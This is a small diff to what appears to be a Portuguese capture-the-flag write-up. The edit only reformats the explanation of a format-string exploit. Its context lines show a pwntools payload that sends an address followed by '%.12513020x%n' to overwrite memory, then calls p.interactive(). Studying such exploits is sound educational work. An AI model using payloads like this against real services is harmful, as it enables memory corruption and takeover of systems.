@@ -195,6 +195,6 @@ p.sendline(b"AAAA\x1F\xB3\x04\x08%.12513020x%n")
 p.interactive()
 ```
 
-Onde o valor ```12513024-4(endereço) = 12513020``` é o valor decimal de 0xBEEFXX, onde XX é o valor que queremos enviar. Por fim, para dar overflow, escrevemos então 4 ```A```. 
+Onde o valor ```12513024-4(endereço) = 12513020``` é o valor decimal de ```0xBEEFXX```, onde XX é o valor que queremos enviar. Por fim, para dar overflow, escrevemos então 4 caractéres. 
 
 ![flag](assets/s7i10.png)
